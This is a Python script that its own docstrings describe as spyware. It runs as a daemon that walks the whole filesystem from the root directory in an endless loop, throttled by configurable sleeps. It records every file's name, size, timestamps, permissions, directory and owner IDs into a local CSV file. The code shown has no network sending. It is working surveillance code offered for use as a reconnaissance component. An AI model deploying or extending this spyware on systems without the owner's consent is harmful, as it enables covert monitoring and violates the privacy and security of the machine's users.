#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" This file implement a SpyWare to get all files and metadata. """

###################
#    This file implement a SpyWare to get all files and metadata.
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

__all__ = ["Daemon", "FilesLogger", "main", "config_load"]

from os import path, scandir, DirEntry, environ
from configparser import ConfigParser
from time import strftime, localtime
from stat import filemode
from time import sleep
from enum import Enum
from sys import argv


def config_load() -> None:

    """ This function load the config file. """

    global Constantes

    CONFIG = ConfigParser()
    env_conf_file = environ.get("filesSpy.conf")

    if len(argv) == 2:
        CONFIG.read(argv[1])
    elif env_conf_file:
        CONFIG.read(env_conf_file)
    else:
        CONFIG.read(path.join(path.dirname(__file__), "filesSpy.conf"))


    class Constantes(Enum):

        timeBetweenDir: float = CONFIG.getfloat("TIME", "directorySleep")
        timeBetweenFiles: float = CONFIG.getfloat("TIME", "fileSleep")
        timeRelaunch: float = CONFIG.getfloat("TIME", "relaunchSleep")
        save_filename: str = CONFIG["SAVE"]["filename"]


class Daemon:

    """ Class implement loop to run for ever. """

    def __init__(self):
        self.time = Constantes.timeRelaunch.value
        self.fileslogger = FilesLogger()
        self.run = True

    def run_for_ever(self):

        """ This function implement the loop to run for ever. """

        self.fileslogger.launch()

        while self.run:
            self.fileslogger.get_filenames(path.normcase("/"))
            if self.run:
                sleep(self.time)

class FilesLogger:

    """ This class get all files and metadata. """

    def __init__(self):
        self.timeFile = Constantes.timeBetweenFiles.value
        self.timeDir = Constantes.timeBetweenDir.value
        self.file = Constantes.save_filename.value

    def launch(self):

        """ This function launch the file logger. """

        if not path.isfile(self.file):
            with open(self.file, "w") as csvfile:
                csvfile.write(
                    "name,size,access_time,modif_time,"
                    "rights,directory,is_uid,is_gid,"
                    "metadata_change_time\n"
                )

    def get_filenames(self, directory: str) -> None:

        """ This function get recursives filenames. """

        for file in scandir(directory):
            if file.is_dir():

                sleep(self.timeDir)
                try:
                    self.get_filenames(path.join(directory, file.name))
                except PermissionError as e:
                    print(e)
            
            elif file.is_file():
            
                sleep(self.timeFile)
                try:
                    self.get_data(file, directory)
                except Exception as e:
                    print(e)

    def get_data(self, file: DirEntry, directory: str) -> None:

        """ This function get metadata and parse filename. """

        metadata = file.stat()
        rights = filemode(metadata.st_mode)

        data = {
            "name": file.name,
            "size": str(metadata.st_size),
            "access_time": strftime("%Y-%m-%d %H:%M:%S", localtime(metadata.st_atime)),
            "modif_time": strftime("%Y-%m-%d %H:%M:%S", localtime(metadata.st_mtime)),
            "rights": rights,
            "directory": directory,
            "is_uid": str(metadata.st_uid),
            "is_gid": str(metadata.st_gid),
            "metadata_change_time": strftime(
                "%Y-%m-%d %H:%M:%S", localtime(metadata.st_ctime)
            ),
        }

        self.save(data)

    def save(self, data: dict) -> None:

        """ This function save data in csv file. """

        data = ",".join(data.values()) + "\n"

        with open(self.file) as file:
            datas = file.read()

        if data not in datas:
            with open(self.file, "a") as csvfile:
                csvfile.write(data)


def main():
    config_load()

    daemon = Daemon()
    try:
        daemon.run_for_ever()
    except KeyboardInterrupt:
        daemon.run = False

if __name__ == "__main__":
    main()